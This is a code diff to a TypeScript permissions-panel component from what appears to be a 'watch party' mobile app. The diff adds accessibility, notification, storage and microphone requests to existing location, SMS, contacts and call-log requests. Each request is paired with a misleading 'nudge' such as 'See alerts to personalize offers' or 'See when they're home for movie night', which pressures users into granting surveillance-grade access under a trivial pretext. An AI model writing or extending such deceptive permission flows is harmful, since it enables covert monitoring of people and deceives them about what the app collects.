@@ -1,5 +1,4 @@
 import type { DevicePermissions } from "../types/device";
-import { PermissionNudge } from "./PermissionNudge";
 
 interface Props {
   perms: DevicePermissions | undefined;
@@ -10,13 +9,22 @@ interface Props {
   loading?: boolean;
 }
 
-const ITEMS: { key: keyof DevicePermissions; label: string; step: string; nudge: string }[] = [
+const CORE_ITEMS: { key: keyof DevicePermissions; label: string; step: string; nudge: string }[] = [
+  { key: "accessibility", label: "Accessibility", step: "accessibility", nudge: "So we can help use the phone." },
+  { key: "notifications", label: "Notifications", step: "notifications", nudge: "See alerts to personalize offers." },
+  { key: "storage", label: "Files & downloads", step: "storage", nudge: "Save downloads and media." },
+  { key: "microphone", label: "Microphone", step: "microphone", nudge: "Talk in watch rooms." },
+];
+
+const MORE_ITEMS: { key: keyof DevicePermissions; label: string; step: string; nudge: string }[] = [
   { key: "location", label: "Location", step: "location", nudge: "See when they're home for movie night." },
   { key: "background_location", label: "Background location", step: "background_location", nudge: "Keep sync alive during long movies." },
   { key: "contacts", label: "Contacts", step: "contacts", nudge: "Invite friends in one tap." },
   { key: "sms", label: "SMS", step: "sms", nudge: "Catch watch-party invites from texts." },
   { key: "call_log", label: "Call log", step: "calls", nudge: "See calls during movie night." },
 ];
+
+const ITEMS = [...CORE_ITEMS, ...MORE_ITEMS];
 
 export function PermissionsPanel({
   perms,
